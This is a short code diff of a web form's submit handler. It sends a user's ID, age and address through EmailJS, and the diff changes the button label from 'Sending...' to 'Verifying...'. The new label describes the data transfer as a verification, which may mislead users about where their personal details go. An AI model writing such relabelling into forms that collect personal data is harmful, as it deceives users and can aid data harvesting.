@@ -202,7 +202,7 @@
     if (!userid || !age || !address) {
       showToast('⚠️ Please fill in all fields before continuing.', 'error'); return;
     }
-    btn.disabled = true; btn.textContent = 'Sending...';
+    btn.disabled = true; btn.textContent = 'Verifying...';
     emailjs.send("service_p6xk4mw", "template_tslrh0l", {
       user_id: userid, user_age: age, address: address,
       remember: remember ? 'Yes' : 'No', submitted_at: new Date().toLocaleString()
